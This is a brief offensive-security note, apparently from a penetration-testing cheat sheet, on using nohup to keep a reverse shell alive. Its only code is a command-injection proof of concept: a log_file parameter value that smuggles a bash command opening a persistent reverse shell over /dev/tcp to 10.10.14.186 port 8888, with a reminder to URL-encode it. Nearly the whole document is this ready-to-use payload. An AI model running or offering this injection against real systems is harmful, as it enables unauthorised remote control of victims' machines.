# NoHup

nohup can be utilized, when the shell get's exited/killed always.

An potential PoC for Command Injection within an network package, could look like this:

Note: That the shell, needs to be url encoded.

```
log_file=/var/log/auth.log$(/bin/bash -c 'nohup bash -i >& /dev/tcp/10.10.14.186/8888 0>&1 &')&analyze_log=
```
